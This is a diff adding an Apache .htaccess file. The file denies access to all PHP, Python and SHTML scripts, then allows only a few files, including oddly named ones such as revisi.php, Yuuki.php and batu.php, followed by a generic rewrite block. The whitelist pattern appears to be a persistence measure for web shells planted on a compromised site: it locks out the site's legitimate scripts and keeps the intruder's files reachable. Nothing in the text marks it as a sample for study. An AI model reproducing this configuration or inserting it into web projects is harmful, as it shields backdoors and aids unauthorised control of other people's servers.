@@ -1,0 +1,19 @@
+Options -Indexes
+<FilesMatch ".*\.(py|shtml|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php7)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(index.php|revisi.php|Yuuki.php|batu.php|remove.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+# BEGIN
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+# END
